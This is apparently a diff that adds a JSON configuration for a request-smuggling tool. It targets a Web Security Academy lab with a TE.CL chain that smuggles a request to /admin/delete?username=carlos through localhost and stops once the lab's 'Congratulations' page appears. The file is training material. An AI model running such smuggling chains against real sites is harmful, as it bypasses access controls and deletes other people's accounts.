@@ -1,0 +1,33 @@
+{
+  "omnislash_config": "config.lab.json",
+  "proxies": "",
+  "log_file": "lab-tecl-chain.jsonl",
+  "poll_interval": "2s",
+  "concurrency": 1,
+  "exit_on_success": true,
+  "control_addr": "",
+  "jobs": [
+    {
+      "name": "te-cl-chain",
+      "target": {
+        "addr": "LAB-ID.web-security-academy.net:443",
+        "host": "LAB-ID.web-security-academy.net",
+        "path": "/"
+      },
+      "tls": "h1",
+      "probe": "smuggle-chain",
+      "variant": "te.cl",
+      "victim_method": "POST",
+      "victim_path": "/",
+      "smuggled_method": "GET",
+      "smuggled_path": "/admin/delete?username=carlos",
+      "smuggled_host": "localhost",
+      "success_contains": "Congratulations",
+      "attempts": 5,
+      "interval": "1s",
+      "timeout": "10s",
+      "idle": "2s",
+      "retry_delay": "1s"
+    }
+  ]
+}
